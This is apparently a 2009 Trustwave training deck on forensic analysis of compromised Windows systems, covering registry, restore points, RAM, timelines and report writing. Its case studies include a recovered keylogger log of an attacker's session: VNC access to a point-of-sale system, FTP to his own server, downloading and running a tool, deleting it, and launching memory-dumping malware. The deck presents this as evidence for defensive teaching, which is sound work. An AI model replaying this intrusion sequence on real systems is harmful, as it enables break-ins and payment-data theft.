Why
Copyright Trustwave 2009
Confidential
Volatile Data Analysis (cont.)
Event Logs (if you are lucky enough to have them)
• Who is logged in
• What have they done
• From where
• Know your event log numbers (or at least know where to read about them)
Registry
• GOLD MINE –
Basically a huge, detailed, log file
• What has each user been doing (ntuser.dat)
−
How
−
From where (know which keys record this data)
−
LastWrite times
• Can be extracted from a live system
• Parsed with RegRipper/RipXP
Copyright Trustwave 2009
Confidential
Volatile Data Analysis (cont.)
Restore Points (Shadow Copy Volumes)
• Record major changes to the system or chronological
• Can be parsed to show when things took place
−
Malware was not present yesterday, but is there today
−
System was “updated”
–
something was installed
−
Registry changes are included (THIS IS HUGE)
• Can be parsed with RipXP
System Information
• Operating System
• Patch level
• Auditing policies
• Password policies
Copyright Trustwave 2009
Confidential
Volatile Data Analysis (cont.)
RAM
• Another GOLD MINE
• Encryption keys
• Running processes
−
Open handles
−
Mutexes
• Garble
• Least frequency of occurrence
−
Dlls being used
−
Network connections
−
Binaries have to be unpacked to run
−
Strings
• Usernames and passwords
• Regexes
• Luhn checks
Copyright Trustwave 2009
Confidential
Data Correlation
Multiple sources build context and confidence
• Various log files (Dr. Watson, Evt, firewall logs, etc)
• Data from restore points (Shadow Volume Copies)
• Registry (System, Software, NTUSER.dat)
KNOW what you are looking for, and what question you are trying 
to answer –
the data will do the rest!  All you have to do it bring it 
all together!
Copyright Trustwave 2009
Confidential
Timeline Analysis
• Can help provide a window into activity on a specific date
• Can provide information about a specific file
• Even deleted files will leave residual timeline fragments
Include:
• File system data
• Registry
• Log files
This a relatively new technique, and you can get a LOT of use out 
of a tool named, “Log2Timeline”
by Kristinn Gudjonsson -
http://www.log2timeline.net/
Copyright Trustwave 2009
Confidential
Tools
Copyright Trustwave 2009
Confidential
Case Studies
All Your Registry Entries Are Belong to Us!
• Binary wiped with sDelete
• Residual evidence of execution left in registry
• LastWriteTime
confirmed time of last execution
• Dates matched entries in Firewall Logs!
Timeline Says U R p0wn3d
• Timeline shows nefarious activity
• Quickly identified malware, dump file, and method of exfiltration
• Multiple breaches –
All visible in the timeline!
Don’t Count Your Keylogger B4 It’s Hatched…wait…what???
• Identified keylogger
output file from timeline
• Outfile
contained IP address, as well as malawre
• TIP: DON’T start your keylogger
if you still have tools to 
download!
Copyright Trustwave 2009
Confidential
All Your Registry Entries and Belong to Us!
LastWrite Time Thu Mar  4 09:18:13 2010 (UTC)
MRUList = a
a -> C:\WINDOWS\system32\ENT.exe
LastWrite Time Thu Mar  4 09:18:13 2010 (UTC)
MRUList = a
a -> C:\WINDOWS\system32\10.193.nbscan.csv
listsoft v.20080324
List the contents of the Software key in the NTUSER.DAT hive
file, in order by LastWrite time.
Thu Mar  4 09:27:49 2010Z ENT2
Thu Mar  4 09:18:53 2010Z Far
Copyright Trustwave 2009
Confidential
All Your Registry Entries and Belong to Us!
LastWrite Time Thu Mar  4 09:18:53 2010 (UTC)
Software\Far\PluginsCache
Software\Far\PluginsCache
LastWrite Time Thu Mar  4 09:18:46 2010 (UTC)
Software\Far\PluginsCache\Plugin0
Software\Far\PluginsCache\Plugin0
LastWrite Time Thu Mar  4 09:18:46 2010 (UTC)
Software\Far\PluginsCache\Plugin0\Exports
Software\Far\PluginsCache\Plugin0\Exports
LastWrite Time Thu Mar  4 09:18:46 2010 (UTC)
SetFindList -> 0
OpenPlugin -> 1
ProcessEditorEvent -> 0
ProcessEditorInput -> 0
OpenFilePlugin -> 0
ProcessViewerEvent -> 0
SysID -> 0
CommandPrefix -> ftp
ID -> 21000afa9e205afac4494
Flags -> 0
PluginMenuString0 -> FTP client
Preload -> 0
PluginConfigString0 -> FTP client
DiskMenuNumber0 -> 2
DiskMenuString0 -> FTP
Name -> C:\WINDOWS\system32\dver\Plugins\FTP\FARFTP.DLL
Software\Far\SavedDialogHistory
Software\Far\SavedDialogHistory
LastWrite Time Thu Mar  4 09:18:53 2010 (UTC)
Software\Far\SavedDialogHistory\Copy
Software\Far\SavedDialogHistory\Copy
LastWrite Time Thu Mar  4 09:28:16 2010 (UTC)
Line1 -> C:\WINDOWS\system32\dver
Line0 -> C:\WINDOWS\system32\
Copyright Trustwave 2009
Confidential
Timeline Says U R p0wn3d
Tue Mar 23 2010 03:41:47,14194,mac.,r/rrwxrwxrwx,0,0,50532-128-4,'C:/'/WINDOWS/Prefetch/FTP.EXE-06C55CF9.pf
Tue Mar 23 2010 03:42:18,264704,m...,r/rrwxrwxrwx,0,0,35378-128-3,'C:/’/WINDOWS/system32/b.exe
Tue Mar 23 2010 03:42:18,264704,m...,r/rrwxrwxrwx,0,0,35382-128-3,'C:/’/WINDOWS/system32/ssms.exe
Tue Mar 23 2010 03:42:31,264704,...b,r/rrwxrwxrwx,0,0,35378-128-3,'C:/’/WINDOWS/system32/b.exe
Tue Mar 23 2010 03:42:31,11796,...b,r/rrwxrwxrwx,0,0,35381-128-4,'C:/'/WINDOWS/Prefetch/BAND1.EXE-05391BAA.pf
Tue Mar 23 2010 03:42:36,264704,...b,r/rrwxrwxrwx,0,0,35382-128-3,'C:/’/WINDOWS/system32/ssms.exe
Tue Mar 23 2010 03:42:36,54046,...b,r/rrwxrwxrwx,0,0,35383-128-4,'C:/'/WINDOWS/Prefetch/B.EXE-2FBDED0A.pf
Tue Mar 23 2010 03:42:38,10878,...b,r/rrwxrwxrwx,0,0,35413-128-4,'C:/'/WINDOWS/Prefetch/SSMS.EXE-25BDC5E5.pf
Tue Mar 23 2010 03:42:46,11796,mac.,r/rrwxrwxrwx,0,0,35381-128-4,'C:/'/WINDOWS/Prefetch/BAND1.EXE-05391BAA.pf
Tue Mar 23 2010 03:43:15,92160,...b,r/rrwxrwxrwx,0,0,35414-128-3,'C:/'/WINDOWS/bupl.dll
Tue Mar 23 2010 03:43:16,92160,m.c.,r/rrwxrwxrwx,0,0,35414-128-3,'C:/'/WINDOWS/bupl.dll
Tue Mar 23 2010 03:43:16,56,...b,d/drwxrwxrwx,0,0,35421-144-5,'C:/'/WINDOWS/system32/drivers/blogs
Tue Mar 23 2010 03:43:38,20315,...b,r/rrwxrwxrwx,0,0,35422-128- 
4,'C:/'/WINDOWS/system32/drivers/blogs/23_03_2010.html
Copyright Trustwave 2009
Confidential
Don’t Count Your Keylogger B4 It’s 
Hatched…wait…what???
UltraVNC Win32 Viewer 1.0.1 Release  Attacker using UltraVNC to access 
POS system
VNC Authentication support Enter 1pos ( 192.168.108.101 ) cmd Enter
ftp X0.X.X.218  Attacker initiating FTP session with his server 
(username and password not available since the commands would have 
been issued on the remote system and not logged locally)  
Enter Enter Enter hash Enter bin Enter mget band1.exe  Attacker 
downloading additional tool
Bye  Attacker terminating FTP session
Enter band1.exe  Attacker initiating binary
Enter del band1.exe  Attacker deleting binary
DDCDSRV1 7.3.447 –HACKMEBANK Attacker accesses Digital Dining
Enter ioi.exe <- Attacker launching Memory Dumping Malware
Copyright Trustwave 2009
Confidential
Bring it all together
What was your goal
• Restate your objectives
−
“The goal of this investigation was to determine BLAH…”
• Conclusions should support objectives
−
“It was determined that BLAH took place…”
• Clear, concise, direct
−
Know your audience
• C-Staff / technical / small business owner
• Write to your audience
• “Leave your ego at the door”
−
No fluff
• Say what you need to say and move on…DO NOT be verbose
−
No erroneous information
• Deliver what you were brought in to deliver
Copyright Trustwave 2009
Confidential
Bring it all together (cont.)
What data provided answers
• Here is where to be specific
−
Should be repeatable by anyone
−
State exactly what you did and why
−
Avoid “lameness”
What were the answers
• How do they support the goals
• Sound conclusions are indisputable
• You are the expert (So act like it!)
Copyright Trustwave 2009
Confidential
Conclusion
• 
Develop an analysis plan
• 
Apply sound logic
• 
Use data reduction
• 
Identify anomalies
• 
Generate a conclusion based on:
–
Customer objectives
–
Guiding principles
–
Data analysis
• 
Let the DATA guide your theory…NEVER force the data into 
your theory!
Questions? 
PI:EMAIL